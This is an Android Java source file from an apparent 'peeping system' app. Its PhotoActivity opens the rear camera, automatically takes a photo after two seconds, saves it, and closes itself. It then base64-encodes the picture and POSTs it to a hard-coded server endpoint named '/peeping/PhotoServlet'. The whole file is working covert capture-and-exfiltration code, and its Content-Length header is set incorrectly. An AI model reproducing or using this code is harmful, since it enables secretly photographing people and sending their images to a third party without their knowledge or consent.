package photo;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import peep.example.com.peepingsystem.R;

/**
 * Created by krito on 2019/7/22.
 */

public class PhotoActivity extends AppCompatActivity {
//    final static String sendurl = "http://192.168.43.6:8080/location/Upload";
    final static String sendurl = "http://192.168.43.211:8080/peeping/PhotoServlet";

    private static final String TAG = "PhotoActivity";
    private SurfaceView mSurfaceView;
    private SurfaceHolder mSurfaceHolder;
    private Camera mCamera;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_photo);

        mSurfaceView = (SurfaceView) findViewById(R.id.surface_view);

        mSurfaceHolder = mSurfaceView.getHolder();
        mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        mSurfaceHolder.addCallback(new NewSurfaceHoler());

    }

    class NewSurfaceHoler implements SurfaceHolder.Callback {

        @Override
        public void surfaceCreated(SurfaceHolder holder) {
            try {

                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                int numberOfCameras = Camera.getNumberOfCameras();
                for (int i = 0; i < numberOfCameras; i++) {
                    Camera.getCameraInfo(i, cameraInfo);
//                    打开后置摄像头
                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
//                    打开前置摄像头
//                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        mCamera = Camera.open(i);
                        mCamera.setPreviewDisplay(holder);
                        mCamera.setDisplayOrientation(getPreviewDegree(PhotoActivity.this));//获取拍摄角度
                        mCamera.startPreview();//开启预览

                        /**
                         * 相机开启需要时间 延时takePicture
                         */
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                mCamera.takePicture(null, null, new Camera.PictureCallback() {
                                    @Override
                                    public void onPictureTaken(byte[] data, Camera camera) {
                                        Bitmap source = BitmapFactory.decodeByteArray(data, 0, data.length);
                                        int degree = Config.readPictureDegree(getFilePath());
                                        Bitmap bitmap = Config.rotaingImageView(degree, source);

                                        Config.Image = bitmap;
                                        saveBitmap(bitmap, new File(getFilePath()));
                                    }
                                });
                            }
                        }, 2000);

                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
            Camera.Parameters parameters = mCamera.getParameters(); // 获取各项参数
            parameters.setPictureFormat(PixelFormat.JPEG); // 设置图片格式
            parameters.setJpegQuality(100); // 设置照片质量

            /**
             * 以下不设置在某些机型上报错
             */
            int mPreviewHeight = parameters.getPreviewSize().height;
            int mPreviewWidth = parameters.getPreviewSize().width;
            parameters.setPreviewSize(mPreviewWidth, mPreviewHeight);
            parameters.setPictureSize(mPreviewWidth, mPreviewHeight);

            mCamera.setParameters(parameters);
        }

        @Override
        public void surfaceDestroyed(SurfaceHolder holder) {
            mCamera.stopPreview();//关闭预览
            mCamera.unlock();
            mCamera.release();
        }
    }

    public String getFilePath() {
        return getFileDir(this) + "/12333.jpg";
    }


    private String getFileDir(Context context) {
        boolean canCreateOutside = Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())
                || !isExternalStorageRemovable();

        if (canCreateOutside) {
            File filesExternalDir = context.getExternalFilesDir(null);
            if (filesExternalDir != null) {
                return filesExternalDir.getPath();
            }
        }

        // Application must have this dir
        return context.getFilesDir().getPath();
    }

    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
    public static boolean isExternalStorageRemovable() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
            return Environment.isExternalStorageRemovable();
        }
        return true;
    }

//    保存照片
    public void saveBitmap(Bitmap bitmap, File f) {

        if (f.exists()) {
            f.delete();
        }
        try {
            FileOutputStream out = new FileOutputStream(f);
            bitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
            out.flush();
            out.close();

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            setResult(0);
            finish();
        }
        //发送图片线程
        sendJpg();
    }


    /**
     * 调整预览旋转角度
     *
     * @param activity
     * @return
     */
    public static int getPreviewDegree(Activity activity) {
        // 获得手机的方向
        int rotation = activity.getWindowManager().getDefaultDisplay().getRotation();
        int degree = 0;
        // 根据手机的方向计算相机预览画面应该选择的角度
        switch (rotation) {
            case Surface.ROTATION_0:
                degree = 90;
                break;
            case Surface.ROTATION_90:
                degree = 0;
                break;
            case Surface.ROTATION_180:
                degree = 270;
                break;
            case Surface.ROTATION_270:
                degree = 180;
                break;
        }
        return degree;
    }

//    发送图片
    public void sendJpg(){
        new Thread( new Runnable() {
            @Override
            public void run() {
                Bitmap bitmap = BitmapFactory.decodeFile( getFilePath() );
                String base64str = Bitmap2StrByBase64( bitmap );

//                base64的字符串，请求的url
                sendPost( base64str , sendurl );
            }
        } ).start();
    }

    /**
     * 通过Base32将Bitmap转换成Base64字符串
     * @param bit
     * @return
     */
    public String Bitmap2StrByBase64(Bitmap bit){
        ByteArrayOutputStream bos=new ByteArrayOutputStream();
        bit.compress( Bitmap.CompressFormat.JPEG, 40, bos);//参数100表示不压缩
        byte[] bytes=bos.toByteArray();
        String string = Base64.encodeToString(bytes, Base64.DEFAULT);

        Log.e( TAG , "JPEG解码base64成功" + "长度： " +  string.length());

        return string;
    }

            //发送图片
    public static void sendPost(String s , String requestURL) {
//        s.replace(" " , "+");
        String string = "pic=" + s;

        byte[] data = string.getBytes();

        try {
            URL url = new URL( requestURL );
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");//设置以Post方式提交数据
            conn.setConnectTimeout(3000);     //设置连接超时时间
            conn.setDoInput(true);            //打开输入流，以便从服务器获取数据
            conn.setDoOutput(true);           //打开输出流，以便向服务器提交数据
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); // 请求头, 必须设置
            conn.setRequestProperty("Content-Length", data + ""); // 注意是字节长度, 不是字符长度
            conn.setUseCaches(false); //使用Post方式不能使用缓存
            /**
             * 当文件不为空，把文件包装并且上传
             */
            OutputStream outputStream = conn.getOutputStream();
            outputStream.write( data );
            outputStream.close();

//            获取返回的成功代码
            int code = conn.getResponseCode();
            Log.e( "tag" , "服务器的状态返回码：" + code );

            if (code == 200){
//                        打印成功
                Log.e( "tag" , "发送数据成功，状态码：" + code );
            }else {
                Log.e( "tag" , "发送数据失败，状态码：" + code );
            }

        }catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        finish();
    }
}
